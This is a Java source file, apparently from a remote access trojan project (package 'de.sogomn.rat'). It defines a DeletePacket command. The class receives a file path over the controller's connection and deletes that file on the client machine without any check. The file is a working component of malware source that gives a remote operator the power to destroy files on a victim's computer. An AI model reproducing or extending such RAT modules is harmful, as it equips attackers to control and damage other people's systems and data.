package de.sogomn.rat.packet;

import java.io.File;

import de.sogomn.rat.ActiveClient;

public final class DeletePacket implements IPacket {
	
	private String path;
	
	public DeletePacket(final String path) {
		this.path = path;
	}
	
	public DeletePacket() {
		this("");
	}
	
	@Override
	public void send(final ActiveClient client) {
		client.writeUTF(path);
	}
	
	@Override
	public void receive(final ActiveClient client) {
		path = client.readUTF();
	}
	
	@Override
	public void execute(final ActiveClient client) {
		final File file = new File(path);
		
		file.delete();
	}
	
}
